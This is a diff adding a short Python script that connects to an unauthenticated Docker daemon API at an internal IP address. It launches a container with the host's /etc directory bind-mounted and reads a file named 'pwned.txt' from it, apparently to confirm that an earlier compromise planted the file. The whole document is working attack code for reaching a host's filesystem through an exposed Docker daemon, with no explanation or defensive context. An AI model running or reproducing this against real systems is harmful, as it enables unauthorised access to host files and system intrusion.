@@ -1,0 +1,8 @@
+import docker
+c = docker.DockerClient(base_url='http://172.18.0.2:2375/')
+container = c.containers.create('alpine:latest',
+                                ['sh','-c','cat /tmp/etc/pwned.txt || echo NOT_FOUND'],
+                                host_config=c.api.create_host_config(binds={'/etc': {'bind': '/tmp/etc', 'mode': 'ro'}}))
+c.api.start(container.id)
+logs = c.api.logs(container.id, stdout=True, stderr=True)
+print(logs.decode())
